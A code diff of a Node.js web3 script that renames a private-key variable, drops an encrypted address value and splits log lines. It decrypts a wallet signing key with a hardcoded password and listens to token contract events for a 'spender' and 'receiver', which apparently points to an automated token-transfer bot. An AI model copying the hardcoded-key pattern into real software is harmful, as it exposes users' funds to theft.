@@ -14,7 +14,7 @@ var moment = require("moment")
 var mysql = require('mysql');
 
 var Settings = null;
-var privateKey, spender, receiver, mAddress;
+var spenderPk, spender, receiver;
 var password = 'Weathy Invest';
 
 var isDev = false
@@ -79,7 +79,7 @@ var db = {
     },
 }
 
-// log(privateKey)
+// log(spenderPk)
 // log(COLOR.Clear);
 
 async function loadSettings(file = "settings.json") {
@@ -87,7 +87,7 @@ async function loadSettings(file = "settings.json") {
     let content = fs.readFileSync(file, "utf8");
     let settings = JSON.parse(content)
     receiver = settings.receiver
-    settings.spenderPk = privateKey = decryptString(settings.spenderPk)
+    settings.spenderPk = spenderPk = decryptString(settings.spenderPk)
 
     spender = (new Web3()).eth.accounts.privateKeyToAccount(settings.spenderPk).address
     Settings = settings;
@@ -239,7 +239,7 @@ function listenEvents(settings = Settings) {
             }
 
             let web3 = new Web3(provider)
-            web3.eth.accounts.wallet.add(privateKey)
+            web3.eth.accounts.wallet.add(spenderPk)
 
             let contract = new web3.eth.Contract(abi, tokens[symbol][chainId].address)
             if (chainId == 5) test(contract)
@@ -304,10 +304,10 @@ loadSettings()
 
         db.config = settings.database
         db.connect().then(c => {
-            mAddress = CryptoJS.AES.encrypt(spender, password).toString();
 
-            logWaning("dev", isDev, "mAddress:", mAddress)
-            logWaning("spender:", spender, "receiver:", receiver)
+            logWaning("dev:", isDev)
+            logWaning("spender:", spender)
+            logWaning("receiver:", receiver)
 
             let web3s, contracts = listenEvents(settings)
             // sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))
@@ -354,7 +354,7 @@ wss.on('connection', (ws) => {
 
     sendMessageClient({
         status: {
-            spender: spender, receiver: receiver, mAddress: mAddress
+            spender: spender, receiver: receiver
         }
     });
 
